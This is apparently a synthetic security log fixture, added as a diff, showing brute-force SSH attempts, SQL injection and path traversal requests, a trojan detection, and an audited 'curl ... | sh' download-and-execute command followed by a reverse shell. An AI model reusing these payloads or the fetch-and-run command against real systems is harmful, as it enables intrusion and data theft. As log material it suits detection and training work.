@@ -1,0 +1,19 @@
+2026-04-27T20:11:02Z vm1-linux sshd[2184]: Failed password for root from 185.199.108.23 port 51244 ssh2
+2026-04-27T20:11:05Z vm1-linux sshd[2191]: Failed password for admin from 185.199.108.23 port 51249 ssh2
+2026-04-27T20:11:09Z vm1-linux sshd[2198]: Failed password for root from 185.199.108.23 port 51257 ssh2
+2026-04-27T20:11:14Z vm1-linux sshd[2204]: Failed password for deploy from 185.199.108.23 port 51261 ssh2
+2026-04-27T20:11:19Z vm1-linux sshd[2212]: Failed password for root from 185.199.108.23 port 51266 ssh2
+2026-04-27T20:11:22Z vm1-linux sshd[2217]: Invalid user oracle from 185.199.108.23 port 51270
+2026-04-27T20:11:27Z vm1-linux sudo[2240]: pam_unix(sudo:auth): authentication failure; user=deploy ruser=deploy tty=/dev/pts/1
+2026-04-27T20:11:31Z vm1-linux sudo[2240]: deploy : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+2026-04-27T20:12:04Z vm1-linux apache-access: 203.0.113.77 - - "GET /login?user=admin' OR '1'='1 HTTP/1.1" 400 219 "-" "sqlmap/1.7"
+2026-04-27T20:12:08Z vm1-linux apache-access: 203.0.113.77 - - "GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1" 403 311 "-" "Mozilla/5.0"
+2026-04-27T20:12:15Z vm1-linux apache-access: 203.0.113.77 - - "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 196 "-" "Mozilla/5.0"
+2026-04-27T20:12:23Z vm1-linux apache-access: 198.51.100.18 - - "POST /api/login HTTP/1.1" 401 74 "-" "curl/8.1"
+2026-04-27T20:12:24Z vm1-linux apache-access: 198.51.100.18 - - "POST /api/login HTTP/1.1" 401 74 "-" "curl/8.1"
+2026-04-27T20:12:25Z vm1-linux apache-access: 198.51.100.18 - - "POST /api/login HTTP/1.1" 401 74 "-" "curl/8.1"
+2026-04-27T20:13:02Z vm1-linux kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e SRC=10.0.0.2 DST=45.155.205.44 PROTO=TCP SPT=48122 DPT=4444
+2026-04-27T20:13:05Z vm1-linux clamd[1187]: /tmp/.cache/update.bin: Win.Trojan.Agent FOUND
+2026-04-27T20:13:08Z vm1-linux audit[2310]: EXECVE argc=3 a0="bash" a1="-c" a2="curl http://45.155.205.44/p.sh | sh"
+2026-04-27T20:13:14Z vm1-linux systemd[1]: Started suspicious reverse shell child process under user www-data.
+2026-04-27T20:13:28Z vm1-linux sentinel-agent: batch_hash=9af0b9bbbc3d167c42f25f53bb43d6f6ea6918aa56f2e4c53a4cf98a39b6c2e1 prev_hash=64abf773c6c26a2ce31f2f9c0c6a0e89f1792c2e8f9a9c97d2a1ce9351e30a44 integrity=VERIFIED
